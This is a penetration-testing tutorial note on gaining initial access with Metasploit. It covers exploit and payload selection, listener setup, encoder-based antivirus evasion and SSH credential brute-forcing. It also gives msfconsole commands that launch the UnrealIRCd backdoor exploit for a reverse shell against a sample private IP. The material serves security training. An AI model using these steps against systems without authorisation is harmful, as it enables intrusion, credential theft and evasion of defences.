# 04-09: Using Metasploit for Initial Access

## What is it used for?
The Metasploit Framework (MSF) is used to automate the process of discovering, testing, and exploiting vulnerabilities. It is a comprehensive platform that provides a vast library of exploit code, payloads, and post-exploitation modules. In the context of initial access, Metasploit is used to deliver an exploit to a target system that, if successful, will execute a payload (like a Meterpreter shell) to give the attacker remote control over the machine. It is the go-to tool for security professionals to validate vulnerabilities and demonstrate the impact of a successful breach.

## Techniques
1.  **Exploit Selection**: Searching for and choosing a specific module that targets a known vulnerability in a service (e.g., SMB, HTTP, SSH).
2.  **Payload Configuration**: Selecting what happens after the exploit succeeds, such as establishing a reverse shell or a Meterpreter session.
3.  **Target Profiling (Auxiliary)**: Using Metasploit's non-exploit modules to scan, fuzz, and enumerate services before attempting an exploit.
4.  **Listener Setup**: Configuring a "handler" on the attacker's machine to wait for and manage the incoming connection from the compromised target.
5.  **Evasion**: Using encoders and NOP generators to modify the exploit or payload to bypass simple antivirus or IDS signatures.

## How those techniques are used
-   **Exploiting a Vulnerable Service**: After an Nmap scan identifies an old version of UnrealIRCd, a tester uses the `exploit/unix/irc/unreal_ircd_3281_backdoor` module to gain access.
-   **Gaining a Meterpreter Shell**: Instead of a simple bash shell, a tester selects the `windows/x64/meterpreter/reverse_tcp` payload, which provides advanced features like file system manipulation, keylogging, and hash dumping.
-   **Brute-Forcing Services**: If a service like SSH is found, the `auxiliary/scanner/ssh/ssh_login` module can be used to test a list of credentials for initial access.
-   **Managing Multiple Sessions**: Metasploit allows an attacker to background one session and work on another, facilitating the management of multiple compromised targets.

## Commands used
-   **Launching and Searching**:
    ```bash
    # Start the Metasploit console
    msfconsole

    # Search for an exploit related to a specific software
    search unrealircd
    ```
-   **Configuring an Exploit**:
    ```bash
    # Select the exploit module
    use exploit/unix/irc/unreal_ircd_3281_backdoor

    # View required settings
    show options

    # Set the target IP address
    set RHOSTS 10.0.0.15

    # Set the attacker's IP for the reverse shell
    set LHOST 10.0.0.5
    ```
-   **Executing and Managing**:
    ```bash
    # Launch the attack
    exploit

    # List active sessions
    sessions -l

    # Interact with a specific session
    sessions -i 1
    ```

## Summary
The Metasploit Framework is an essential tool for streamlining the exploitation phase of a penetration test. By providing a standardized environment for selecting exploits and configuring payloads, it allows security researchers to focus on the strategic aspects of an attack rather than writing custom exploit code from scratch. Mastering the basic workflow of "Search, Use, Set, Exploit" is a foundational skill for any offensive security practitioner.

## Reference links
- [Metasploit Unleashed (OffSec)](https://www.offsec.com/metasploit-unleashed/) - The most comprehensive free training.
- [Rapid7 Metasploit Documentation](https://docs.metasploit.com/)
- [Exploit-DB](https://www.exploit-db.com/) - A source for many exploits found in Metasploit.
- [Metasploit Cheat Sheet](https://www.comparitech.com/net-admin/metasploit-cheat-sheet/)
